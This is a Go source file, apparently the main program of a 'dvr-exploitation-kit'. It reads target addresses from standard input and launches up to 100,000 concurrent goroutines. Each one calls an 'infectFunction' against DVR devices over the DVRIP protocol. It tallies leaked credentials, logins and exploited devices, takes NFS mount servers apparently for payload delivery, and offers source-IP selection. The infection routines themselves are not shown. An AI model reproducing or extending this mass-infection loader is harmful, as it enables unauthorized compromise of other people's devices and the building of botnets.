package main

import (
	"bufio"
	"dvr-exploitation-kit/pkg/logging"
	"fmt"
	"github.com/spf13/pflag"
	"math/rand"
	"net"
	"os"
	"runtime"
	"time"
)

var (
	Processed   = 0
	Connections = 0
	Credentials = 0
	Logins      = 0
	Exploited   = 0

	Port             string
	MaxRoutines      int
	DynamicPortFetch bool
	Debug            bool

	MountPoint   string
	MountServers []string
	SourceIP     net.IP

	dialer = net.Dialer{}
	random = rand.New(rand.NewSource(time.Now().Unix()))
)

// titleWriter will just write status updates to the user
func titleWriter() {
	started := time.Now()

	for {
		_, _ = fmt.Fprintf(
			os.Stderr,
			"%.0fs -> Processed: %d -> Connections: %d -> Leaked: %d -> Logins: %d -> Exploited: %d -> Routines: %d\r\n",
			time.Since(started).Seconds(),
			Processed,
			Connections,
			Credentials,
			Logins,
			Exploited,
			runtime.NumGoroutine(),
		)

		time.Sleep(1 * time.Second)

		if time.Since(started).Seconds() > 60 && runtime.NumGoroutine() < 100 {
			logging.Global.Info().Msg("Too low go routines, exiting..")
			os.Exit(1)
		}
	}
}

func infectFunction(target string) {
	Processed++

	if DynamicPortFetch {
		dvripWebInfectFunction(target)
		return
	}

	dvripInfectFunction(target)
}

func setup() {
	logging.Init(Debug)

	// This should...not happen
	if len(MountServers) == 0 {
		logging.Global.Fatal().Msg("You need to specify at least one mount server.")
	}

	// set src ip
	if SourceIP != nil {
		dialer = net.Dialer{LocalAddr: &net.IPAddr{IP: SourceIP}, Timeout: 15 * time.Second}
	}
}

func main() {
	pflag.StringVarP(&Port, "port", "p", "null", "Port number to connect to.")
	pflag.StringVarP(&MountPoint, "mount-point", "m", "/srv/nfs", "Mount path")
	pflag.StringArrayVarP(&MountServers, "nfs-servers", "n", []string{"127.0.0.1"}, "List of NFS servers to use")

	pflag.IntVarP(&MaxRoutines, "max-routines", "r", 100000, "Maximum number of concurrent Go routines")
	pflag.IPVarP(&SourceIP, "srcip", "s", nil, "Source IP to use")

	pflag.BoolVarP(&DynamicPortFetch, "dynamic-port", "d", false, "Enable dynamic port fetching from the web server")
	pflag.BoolVarP(&Debug, "debug", "D", false, "Enable debug logging")

	pflag.Parse()

	// validate and parse
	setup()

	// start title writer
	go titleWriter()

	// read from stdin
	rdr := bufio.NewScanner(os.Stdin)

	for rdr.Scan() {
		if runtime.NumGoroutine() > MaxRoutines {
			time.Sleep(1 * time.Second)
			continue
		}

		if Port == "null" {
			go infectFunction(rdr.Text())
			continue
		}

		go infectFunction(rdr.Text() + ":" + Port)
	}

	select {}
}
